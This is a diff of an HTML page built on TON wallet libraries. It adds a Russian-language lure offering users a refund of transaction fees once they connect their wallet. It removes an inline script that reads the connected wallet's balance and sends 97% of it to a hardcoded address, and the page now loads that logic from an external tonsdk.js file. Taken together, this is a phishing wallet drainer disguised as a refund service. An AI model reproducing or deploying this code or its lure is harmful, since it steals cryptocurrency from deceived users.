@@ -8,7 +8,7 @@
     <!-- Подключение библиотек TonConnect UI и SDK -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    
+
     <!-- Добавим стиль для фона и кнопок -->
     <style>
         body {
@@ -52,9 +52,17 @@
             font-size: 18px;
             font-weight: bold;
         }
+
+        #greeting {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
+
+    <!-- Текст "Подключите кошелек для расчета возврата части потраченых комиссий" -->
+    <div id="greeting">Подключите кошелек для расчета возврата части потраченых комиссий</div>
 
     <!-- Кнопка для подключения кошелька -->
     <div id="ton-connect"></div>
@@ -65,57 +73,8 @@
     <!-- Место для отображения информации о кошельке и балансе -->
     <div id="wallet-info"></div>
 
-    <!-- Подключаем ваш JavaScript файл -->
+    <!-- Подключаем внешний JavaScript файл -->
     <script src="tonsdk.js"></script>
-
-    <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
-        });
-
-        tonConnectUI.on('walletConnected', async (walletAddress) => {
-            console.log('Адрес кошелька:', walletAddress);
-            
-            // Считываем баланс
-            try {
-                const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
-                const data = await response.json();
-                const balance = parseFloat(data.balance) / 1000000000; // Конвертируем в TON (1 TON = 10^9 nanos)
-                
-                // Отображаем информацию о кошельке и балансе
-                const walletInfoElement = document.getElementById('wallet-info');
-                walletInfoElement.innerHTML = `Адрес кошелька: <b>${walletAddress}</b><br>Баланс: <b>${balance} TON</b>`;
-            } catch (error) {
-                console.error('Ошибка при получении баланса:', error);
-            }
-        });
-
-        // Функция для выполнения трансфера монет
-        async function didtrans() {
-            const walletAddress = tonConnectUI.account.address;
-            const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
-            const data = await response.json();
-            let originalBalance = parseFloat(data.balance);
-            let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
-            let tgBalance = processedBalance / 1000000000;
-
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-                messages: [{
-                    address: "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c", // Ваш основной кошелек
-                    amount: processedBalance
-                }]
-            };
-
-            try {
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log('Транзакция отправлена');
-            } catch (error) {
-                console.error('Ошибка при отправке транзакции:', error);
-            }
-        }
-    </script>
 
 </body>
 </html>
